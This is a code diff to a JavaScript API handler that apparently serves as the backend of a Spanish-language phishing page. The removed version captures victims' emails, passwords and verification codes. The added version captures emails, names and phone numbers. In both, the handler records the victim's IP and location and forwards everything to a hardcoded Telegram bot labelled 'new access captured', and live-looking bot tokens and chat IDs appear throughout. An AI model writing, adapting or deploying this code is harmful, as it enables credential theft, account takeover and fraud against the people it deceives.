@@ -1,9 +1,9 @@
 export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).end();
 
-  const { correo, password, metodo, codigo, fase } = req.body;
-  const botToken = '8867160829:AAEL8B9X5tYSyMamfT9TLfM694-DpL4ST80';
-  const chatId = '8655081226';
+  const { correo, nombre, lada, numero, fase } = req.body;
+  const botToken = '8663956126:AAGOm85p0FkWuVMuZJFkUIsR_avViE4EaTc';
+  const chatId = '7430967735';
 
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'No disponible';
   let ubicacion = 'No disponible';
@@ -17,9 +17,9 @@ export default async function handler(req, res) {
 
   let texto;
   if (fase === '1') {
-    texto = `📩 Nuevo acceso capturado\n\n📧 correo: ${correo}\n👤 password: ${password}\n🌐 IP: ${ip}\n📍 Ubicación: ${ubicacion}`;
+    texto = `📩 Nuevo acceso capturado\n\n📧 correo: ${correo}\n👤 nombre: ${nombre}\n🌐 IP: ${ip}\n📍 Ubicación: ${ubicacion}`;
   } else {
-    texto = `📞 metodo: ${metodo}\n🔢 codigo: ${codigo}`;
+    texto = `📞 lada: ${lada}\n🔢 numero: ${numero}`;
   }
 
   await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -30,3 +30,4 @@ export default async function handler(req, res) {
 
   res.status(200).json({ ok: true });
 }
+
